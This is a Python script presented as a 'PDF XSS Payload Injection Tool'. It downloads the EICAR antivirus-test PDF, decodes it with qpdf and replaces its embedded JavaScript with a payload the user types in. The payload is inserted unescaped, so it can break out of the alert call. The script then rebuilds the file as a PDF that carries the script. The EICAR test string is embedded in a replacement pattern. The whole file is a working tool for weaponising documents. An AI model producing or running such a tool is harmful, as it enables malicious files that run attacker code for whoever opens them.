import os
import subprocess
import requests
import sys
from termcolor import colored


def run_command(command):
    """Run a shell command and print its output."""
    try:
        result = subprocess.run(command, shell=True, check=True, capture_output=True, text=True)
        print(colored(result.stdout, "green"))
        return True
    except subprocess.CalledProcessError as e:
        print(colored(e.stderr, "red"))
        # Treat warnings as non-critical errors
        if "WARNING" in e.stderr:
            return True
        return False


def download_file(url, output_path):
    """Download a file from a URL."""
    try:
        print(colored(f"Downloading {url}...", "yellow"))
        response = requests.get(url)
        if response.status_code == 200:
            with open(output_path, "wb") as f:
                f.write(response.content)
            print(colored(f"Downloaded file saved as {output_path}", "green"))
        else:
            print(colored(f"Failed to download {url}. Status code: {response.status_code}", "red"))
            sys.exit(1)
    except Exception as e:
        print(colored(f"Error downloading file: {str(e)}", "red"))
        sys.exit(1)


def decode_pdf(input_pdf, output_pdf):
    """Decode the PDF for editing."""
    try:
        print(colored(f"Decoding {input_pdf}...", "yellow"))
        command = f"qpdf --qdf --object-streams=disable {input_pdf} {output_pdf}"
        if run_command(command):
            print(colored(f"Decoded PDF saved as {output_pdf}", "green"))
        else:
            raise Exception("Decoding failed!")
    except Exception as e:
        print(colored(f"Error decoding PDF: {str(e)}", "red"))
        sys.exit(1)


def edit_js_in_pdf(decoded_pdf, edited_pdf, js_payload):
    """Edit JavaScript in the decoded PDF."""
    try:
        print(colored(f"Editing JavaScript in {decoded_pdf}...", "yellow"))
        with open(decoded_pdf, "rb") as f:
            content = f.read()

        content_str = content.decode("latin-1")
        updated_content_str = content_str.replace(
            "/JS (// http://github.com/mattias-ohlsson/eicar-standard-antivirus-test-files\\r\\n\\r\\n// Simple obfuscation\\r\\nvar eicarPart1 = \"X5O!P%@AP[4\\\\\\\\PZX54\\(P^\\)7C\"\\r\\nvar eicarPart2 = \"C\\)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\"\\r\\n\\r\\napp.alert\\(eicarPart1 + eicarPart2\\);)",
            f"/JS (app.alert('{js_payload}');)"
        )

        updated_content = updated_content_str.encode("latin-1")
        with open(edited_pdf, "wb") as f:
            f.write(updated_content)

        print(colored(f"Updated PDF saved as {edited_pdf}", "green"))
    except Exception as e:
        print(colored(f"Error editing JavaScript in PDF: {str(e)}", "red"))
        sys.exit(1)


def rebuild_pdf(decoded_pdf, final_pdf):
    """Rebuild the edited PDF into a valid format."""
    try:
        print(colored(f"Rebuilding {decoded_pdf}...", "yellow"))
        command = f"qpdf {decoded_pdf} {final_pdf}"
        if run_command(command):
            print(colored(f"Final PDF saved as {final_pdf}", "green"))
            return final_pdf
        else:
            raise Exception("Rebuilding failed!")
    except Exception as e:
        print(colored(f"Error rebuilding PDF: {str(e)}", "red"))
        sys.exit(1)


def main():
    print(colored("\nPDF XSS Payload Injection Tool", "cyan", attrs=["bold"]))
    print(colored("This tool will download the EICAR PDF, edit its JavaScript payload, and save the modified version.", "yellow"))

    eicar_url = "https://github.com/Sic4rio/eicar-standard-antivirus-test-files/raw/master/eicar-adobe-acrobat-javascript-alert.pdf"
    input_pdf = "eicar-original.pdf"
    decoded_pdf = "decoded.pdf"
    edited_pdf = "edited.pdf"
    final_pdf = "final-xss.pdf"

    try:
        # Download EICAR PDF
        download_file(eicar_url, input_pdf)

        # Decode the PDF
        decode_pdf(input_pdf, decoded_pdf)

        # Prompt user for payload
        js_payload = input(colored("Enter your JavaScript payload (e.g., Hello): ", "cyan"))

        # Edit the JavaScript
        edit_js_in_pdf(decoded_pdf, edited_pdf, js_payload)

        # Rebuild the PDF
        output_file = rebuild_pdf(edited_pdf, final_pdf)

        # Success message with filename
        print(colored(f"\nSuccess! Your modified PDF is saved as: {output_file}", "green", attrs=["bold"]))

    except Exception as e:
        print(colored(f"\nAn error occurred: {str(e)}", "red"))
        sys.exit(1)


if __name__ == "__main__":
    main()
